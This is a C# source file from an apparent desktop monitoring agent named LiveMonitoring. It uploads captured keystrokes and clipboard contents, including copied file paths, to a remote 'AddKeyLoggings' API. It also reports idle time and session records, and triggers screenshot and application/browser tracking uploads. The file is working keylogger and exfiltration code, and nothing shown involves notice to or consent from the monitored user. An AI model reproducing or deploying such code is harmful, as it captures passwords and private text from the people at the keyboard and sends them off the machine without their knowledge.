using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;


namespace LiveMonitoring
{
    public static class GlobalClass
    {
        static GlobalClass()
        {
            ApplicationStartTime = DateTime.Now;
            LastIdletime = GlobalClass.ApplicationNowTime;
            if (SessionStartDate == null)
            {
                SessionStartDate = GlobalClass.ApplicationNowTime;
            }
        }

        //public static readonly string filepath = Path.GetTempPath() + "Sessionvalues.txt";
        //public static readonly string Dirpath = Application.LocalUserAppDataPath + "\\Data\\";

        public static readonly string Dirpath = "C:\\LiveSession";

        public static DateTime LastIdletime
        {
            get;
            set;
        }

        private static DateTime ApplicationStartTime
        {
            get;
            set;
        }

        public static DateTime ApplicationNowTime
        {
            get
            {
                return ApplicationStartTime.AddMinutes(ApplicationAddMinute);
            }
        }

        public static double ApplicationAddMinute
        {
            get;
            set;
        }

        public static bool Iskeyhook
        {
            get;
            set;
        }

        public static int RuningMachineSessionId
        {
            get;
            set;
        }

        public static DateTime? SessionStartDate
        {
            get;

            set;
        }

        public static bool Ismousehook
        {
            get;
            set;
        }

        public static string KeyBordText { get; set; }

        public static string ClipboardOldText { get; set; }

        public static int lastIdleMinute
        {
            get;
            set;
        }

        public static int GetIdletimetillmodechange()
        {
            try
            {
                if ((lastIdleMinute * 60) >= Program.Idle_MinTime)
                {
                    GlobalClass.WriteMachineIdleTime(lastIdleMinute);
                }
                lastIdleMinute = GlobalClass.ApplicationNowTime.Subtract(GlobalClass.LastIdletime).Minutes;
                LastIdletime = GlobalClass.ApplicationNowTime;
                return (lastIdleMinute);
            }
            catch (Exception)
            {
                return 0;
            }
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                Uri myUri = new Uri(Constants.RemoteUrl);

                Ping myPing = new Ping();
                String host = myUri.Host;
                byte[] buffer = new byte[32];
                int timeout = 1000;
                PingOptions pingOptions = new PingOptions();
                PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                if (reply.Status == IPStatus.Success)
                {
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                GlobalClass.WriteTolog("server not giving any response Error in function " + ex.Message);
                return false;
            }
        }

        public static void addKeyLoggerInfo(string LogText, string Type)
        {
            if (LogText != "" && CheckForInternetConnection())
            {
                try
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        KeyLogging model = new KeyLogging { MachineDetailId = Program.MachineId, Text = LogText, TextType = Type, CreatedDate = DateTime.Now };
                        HttpResponseMessage Response = client.PostAsync<KeyLogging>("api/LiveMonitoringAPI/AddKeyLoggings", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            if (result.Contains("OK"))
                            {
                                if (Type == "KL")
                                    KeyBordText = "";
                                // Console.Clear();
                                Console.WriteLine("Record (" + Type + ") saved successfully.");
                                GlobalClass.WriteTolog("Record (" + Type + ") saved successfully.");

                            }
                            else if (result.Contains("Invalid"))
                            {
                                Program.AddMachineInfo();
                            }
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                            GlobalClass.WriteTolog("Error Message - " + result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error In GlobalClass.cs in addKeyLoggerInfo Fuction " + ex.Message);
                    GlobalClass.WriteTolog("Error In GlobalClass.cs in addKeyLoggerInfo Fuction " + ex.Message);
                }
            }
        }

        public static bool InsertNewSessionEntry(DateTime StartDate, DateTime EndDate)
        {
            bool returnData = false;
            try
            {
                if (CheckForInternetConnection() && Program.MachineId > 0)
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        MachineSession model = new MachineSession { MachineDetailId = Program.MachineId, SessionStart = StartDate, SessionEnd = EndDate };
                        HttpResponseMessage Response = client.PostAsync<MachineSession>("api/LiveMonitoringAPI/AddMachineSession", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            if (Convert.ToInt32(result) > 0)
                            {
                                // reset any value is here
                                // Console.Clear();
                                GlobalClass.RuningMachineSessionId = Convert.ToInt32(result);
                                GlobalClass.WriteTolog("Saved New Session insert entry in database" + GlobalClass.RuningMachineSessionId + "Start Time : " + StartDate.ToString("MM/dd/yyyy HH:mm") + " End Date is : " + EndDate.ToString("MM/dd/yyyy HH:mm"));
                                Console.WriteLine("Saved New Session insert entry in database" + GlobalClass.RuningMachineSessionId + "Start Time : " + StartDate.ToString("MM/dd/yyyy HH:mm") + " End Date is : " + EndDate.ToString("MM/dd/yyyy HH:mm"));
                                returnData = true;
                            }
                            else if (Convert.ToInt32(result) == 0)
                            {
                                Program.AddMachineInfo();
                                return false;
                            }
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                        }
                    }
                }
                return returnData;
            }
            catch (Exception)
            {
                return returnData;
            }
        }

        public static bool InsertUploadSessionEntry(DateTime StartDate, DateTime EndDate)
        {
            bool returnData = false;
            try
            {
                if (CheckForInternetConnection() && Program.MachineId > 0)
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        MachineSession model = new MachineSession { MachineDetailId = Program.MachineId, SessionStart = StartDate, SessionEnd = EndDate };
                        HttpResponseMessage Response = client.PostAsync<MachineSession>("api/LiveMonitoringAPI/AddMachineSession", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            if (Convert.ToInt32(result) > 0)
                            {
                                // reset any value is here
                                // Console.Clear();
                                Console.WriteLine("Insert New Session ID is : " + Convert.ToInt32(result) + "Start Time : " + StartDate.ToString("MM/dd/yyyy HH:mm") + " End Date : " + EndDate.ToString("MM/dd/yyyy HH:mm"));
                                GlobalClass.WriteTolog("Insert New Session ID is : " + Convert.ToInt32(result) + "Start Time : " + StartDate.ToString("MM/dd/yyyy HH:mm") + " End Date : " + EndDate.ToString("MM/dd/yyyy HH:mm"));
                                returnData = true;
                            }
                            else if (Convert.ToInt32(result) == 0)
                            {
                                Program.AddMachineInfo();
                                return false;
                            }
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                        }
                    }
                }
                return returnData;
            }
            catch (Exception)
            {
                return returnData;
            }
        }

        public static void SaveNewSessionEntry()
        {
            if (GlobalClass.RuningMachineSessionId == 0)
            {
                //insert New Entry other wise no action
                InsertNewSessionEntry(GlobalClass.SessionStartDate.Value, GlobalClass.SessionStartDate.Value);
            }
        }

        internal static void WriteSessionEntry()
        {
            if (!Directory.Exists(Dirpath))
            {
                Directory.CreateDirectory(Dirpath);
            }

            if (Directory.Exists(Dirpath))
            {
                if (GlobalClass.RuningMachineSessionId == 0)
                {
                    GlobalClass.WriteTolog("Write Session insert entry in text file session ID is " + GlobalClass.RuningMachineSessionId + " Session start time is  " + GlobalClass.SessionStartDate.Value.ToString("yyyy-MM-dd HH:mm") + " Session End time is " + GlobalClass.ApplicationNowTime.ToString("yyyy-MM-dd HH:mm"));
                    string insertstring = GlobalClass.RuningMachineSessionId + "+" + GetStringFileDate(GlobalClass.SessionStartDate.Value) + "+" + GetStringFileDate(GlobalClass.ApplicationNowTime);
                    insertstring = Dirpath + "\\" + insertstring + ".txt";
                    File.Create(insertstring);
                    GlobalClass.RuningMachineSessionId = 0;
                    GlobalClass.SessionStartDate = GlobalClass.ApplicationNowTime;
                }
                else
                {
                    GlobalClass.WriteTolog("Write Session Update entry in text file Session ID  is " + GlobalClass.RuningMachineSessionId + " and Session END Time is " + GlobalClass.ApplicationNowTime.ToString("yyyy-MM-dd HH:mm"));
                    string insertstring = GlobalClass.RuningMachineSessionId + "+" + GetStringFileDate(GlobalClass.ApplicationNowTime);
                    insertstring = Dirpath + "\\" + insertstring + ".txt";
                    File.Create(insertstring);
                    GlobalClass.RuningMachineSessionId = 0;
                    GlobalClass.SessionStartDate = GlobalClass.ApplicationNowTime;
                }
            }
        }

        internal static void WriteTolog(string stringmsg)
        {
            var maxRetry = 3;
            for (int retry = 0; retry < maxRetry; retry++)
            {
                try
                {
                    using (StreamWriter sw = new StreamWriter(Path.GetTempPath() + "LiveLogFile" + DateTime.Now.ToString(" dd MM yyyy") + ".txt", true))
                    {
                        sw.WriteLine(DateTime.Now.ToString("g") + " " + stringmsg);
                        break; // you were successfull so leave the retry loop
                    }
                }
                catch (IOException)
                {
                    if (retry < maxRetry - 1)
                    {
                        System.Threading.Thread.Sleep(2000); // Wait some time before retry (2 secs)
                    }
                    else
                    {
                        // handle unsuccessfull write attempts or just ignore.
                    }
                }
            }



        }

        public static void FncClipboard()
        {
            string ClipboardText = GetClipboardText();
            if (ClipboardText != "" && ClipboardOldText != ClipboardText)
            {
                ClipboardOldText = ClipboardText;
                addKeyLoggerInfo(ClipboardText, "CB");

            }
        }

        private static string GetClipboardText()
        {
            string Result = string.Empty;
            Thread staThread = new Thread(x =>
            {
                try
                {
                    string ResultText = Clipboard.GetText();
                    IDataObject myDataObject = Clipboard.GetDataObject();
                    string[] files = (string[])myDataObject.GetData(DataFormats.FileDrop);

                    if (ResultText != "")
                    {
                        Result = ResultText;
                    }
                    else if (files != null)
                    {
                        for (int i = 0; i < files.Count(); i++)
                        {
                            Result = Result + files[i];
                            Result = Result + " | ";
                        }
                        Result = Result.Remove(Result.Length - 3);
                    }
                }
                catch (Exception ex)
                {
                    Result = "";
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
            return Result;
        }

        public static void WriteMachineIdleTime(int IdleTimemin)
        {
            int IdleTimeSec = (IdleTimemin * 60);
            if (IdleTimeSec >= Program.Idle_MinTime && CheckForInternetConnection())
            {
                using (HttpClient client = MachineInfoTracker.GetHttpClient())
                {
                    MachineIdle model = new MachineIdle { MachineDetailId = Program.MachineId, IdleTime = IdleTimeSec, CreatedDate = DateTime.Now };
                    HttpResponseMessage Response = client.PostAsync<MachineIdle>("api/LiveMonitoringAPI/AddMachineIdleTime", model, new JsonMediaTypeFormatter()).Result;

                    if (Response.IsSuccessStatusCode == true)
                    {
                        var result = Response.Content.ReadAsStringAsync().Result;
                        if (result.Contains("OK"))
                        {
                            Console.WriteLine("Record (Idle Time is :- " + lastIdleMinute + ") saved successfully.");
                            GlobalClass.lastIdleMinute = 0;
                            GlobalClass.LastIdletime = GlobalClass.ApplicationNowTime;
                        }
                        else if (result.Contains("Invalid"))
                        {
                            Program.AddMachineInfo();
                        }
                    }
                    else if (Response != null && Response.IsSuccessStatusCode == false)
                    {
                        var result = Response.Content.ReadAsStringAsync().Result;
                        Console.Write("Error Message - " + result);
                    }
                }
            }
        }

        internal static void UploadLocalSessionData()
        {
            if (Directory.Exists(Dirpath) && CheckForInternetConnection())
            {
                DirectoryInfo dinfo = new DirectoryInfo(Dirpath);
                FileInfo[] Files = dinfo.GetFiles("*.txt");
                foreach (FileInfo file in Files)
                {
                    try
                    {
                        string str = Path.GetFileNameWithoutExtension(file.Name);
                        string[] inData = str.Split('+');

                        if (inData.ToList().Count == 2) //Update Entry File
                        {
                            try
                            {
                                int Id = Convert.ToInt32(inData[0]);
                                string END = GetStringFileDate(inData[1]);
                                DateTime ENDDate = DateTime.ParseExact(END, "MM-dd-yyyy HH:mm:ss ", new System.Globalization.CultureInfo("en-US"), System.Globalization.DateTimeStyles.None);
                                if (UpdateSession(ENDDate, Id))
                                {
                                    File.Delete(file.FullName);
                                    GlobalClass.WriteTolog("Delete Session Temp File : " + file.FullName);
                                }
                            }
                            catch (Exception)
                            {

                            }

                        }
                        else if (inData.ToList().Count == 3)//Insert Entry File
                        {
                            try
                            {
                                int Id = Convert.ToInt32(inData[0]);
                                string END = GetStringFileDate(inData[2]);
                                string START = GetStringFileDate(inData[1]);

                                DateTime StartTime = DateTime.ParseExact(START, "MM-dd-yyyy HH:mm:ss ", new System.Globalization.CultureInfo("en-US"), System.Globalization.DateTimeStyles.None);
                                DateTime EndTime = DateTime.ParseExact(END, "MM-dd-yyyy HH:mm:ss ", new System.Globalization.CultureInfo("en-US"), System.Globalization.DateTimeStyles.None);

                                if (InsertUploadSessionEntry(StartTime, EndTime))
                                {
                                    File.Delete(file.FullName);
                                    GlobalClass.WriteTolog("Delete Session Temp File : " + file.FullName);
                                }
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }
                    catch (Exception)
                    {

                    }
                }
            }

        }

        private static string GetStringFileDate(string fileDateFormat)
        {
            string Value = string.Empty;
            try
            {
                string[] inData = fileDateFormat.Split('-');

                Value += inData[0] + "-";//MM
                Value += inData[1] + "-";//DD
                Value += inData[2] + " ";//Year
                Value += inData[3] + ":";//HH
                Value += inData[4] + ":";//mm
                Value += inData[5] + " ";//ss
            }
            catch (Exception)
            {

            }

            return Value;
        }

        private static string GetStringFileDate(DateTime fileDateFormat)
        {
            string Value = string.Empty;
            try
            {
                Value += fileDateFormat.ToString("MM") + "-";//MM
                Value += fileDateFormat.ToString("dd") + "-";//DD
                Value += fileDateFormat.ToString("yyyy") + "-";//Year
                Value += fileDateFormat.ToString("HH") + "-";//HH
                Value += fileDateFormat.ToString("mm") + "-";//mm
                Value += fileDateFormat.ToString("ss");//ss
            }
            catch (Exception)
            {

            }

            return Value;
        }

        public static bool UpdateSession(DateTime SessionEndDate, int PrimaryKey)
        {
            bool ReturnUpdate = false;
            try
            {
                if (CheckForInternetConnection() && PrimaryKey != 0)
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        MachineSession model = new MachineSession { MachineSessionId = PrimaryKey, MachineDetailId = Program.MachineId, SessionEnd = SessionEndDate, SessionStart = SessionEndDate };
                        HttpResponseMessage Response = client.PostAsync<MachineSession>("api/LiveMonitoringAPI/UpdateMachineSession", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            if (Convert.ToInt32(result) == PrimaryKey)
                            {
                                Console.WriteLine("Update id is :- " + PrimaryKey + " and End Time Is" + SessionEndDate);
                                GlobalClass.WriteTolog("Update id is :- " + PrimaryKey + " and End Time Is" + SessionEndDate);
                                // reset any value is here
                                // Console.Clear();
                                ReturnUpdate = true;
                            }
                            else if (Convert.ToInt32(result) == 0)
                            {
                                Program.AddMachineInfo();
                            }
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                        }
                    }
                }
                return ReturnUpdate;
            }
            catch (Exception)
            {
                return ReturnUpdate;
            }
        }
    }

    public class ApplicationData
    {
        public void SendToServer()
        {
            if (GlobalClass.CheckForInternetConnection())
            {
                //1.) save Keybord test here
                GlobalClass.addKeyLoggerInfo(GlobalClass.KeyBordText, "KL");

                //2.) save Clipbord test here
                GlobalClass.FncClipboard();

                //3.) save Idle time here
                GlobalClass.WriteMachineIdleTime(GlobalClass.lastIdleMinute);

                //4.)Send Screenshot 
                ScreenShot.fncScreenShot();

                //5.) Send Application and BrowerDetails
                AppTracker.fncAppTracker();

                //6.) Send All Local Session Data
               // GlobalClass.UploadLocalSessionData();
            }
        }
    }

    public class KeyLogging
    {
        public int KeyLoggerId { get; set; }

        public int MachineDetailId { get; set; }

        public string Text { get; set; }

        public string TextType { get; set; }

        public DateTime? CreatedDate { get; set; }
    }

    public class MachineIdle
    {
        public int IdleTimeId { get; set; }

        public int MachineDetailId { get; set; }

        public int IdleTime { get; set; }

        public DateTime? CreatedDate { get; set; }
    }

    public class MachineSession
    {
        public int MachineSessionId { get; set; }

        public int MachineDetailId { get; set; }

        public DateTime SessionStart { get; set; }

        public DateTime SessionEnd { get; set; }
    }
}
